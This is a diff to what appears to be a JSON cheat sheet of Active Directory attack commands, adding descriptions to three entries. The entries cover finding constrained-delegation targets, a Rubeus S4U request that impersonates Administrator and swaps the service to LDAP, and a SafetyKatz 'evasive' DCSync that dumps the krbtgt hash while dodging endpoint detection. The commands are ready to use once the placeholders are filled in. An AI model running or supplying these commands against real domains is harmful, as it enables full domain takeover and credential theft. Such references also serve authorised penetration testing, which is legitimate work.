@@ -60,15 +60,18 @@
   "variations": [
     {
       "label": "AD Module: find constrained delegation targets",
-      "command": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo"
+      "command": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo",
+      "description": "AD Module: find constrained delegation targets. See the command syntax for exact parameters and flags."
     },
     {
       "label": "S4U with /altservice swap (e.g. time -> ldap for DCSync)",
-      "command": "Rubeus.exe s4u /user:<user> /aes256:<key> /impersonateuser:Administrator /msdsspn:time/<dc_host> /altservice:ldap /ptt"
+      "command": "Rubeus.exe s4u /user:<user> /aes256:<key> /impersonateuser:Administrator /msdsspn:time/<dc_host> /altservice:ldap /ptt",
+      "description": "Uses Rubeus for S4U (Service-for-User) Kerberos extension abuse. Performs constrained delegation attacks by requesting tickets on behalf of other users to access target services."
     },
     {
       "label": "DCSync after LDAP service swap",
-      "command": "SafetyKatz.exe \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\""
+      "command": "SafetyKatz.exe \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\"",
+      "description": "Performs DCSync through an evasive loader to extract password hashes from the domain controller by simulating replication. The loader wraps Mimikatz to evade endpoint detection."
     }
   ],
   "recommended": [
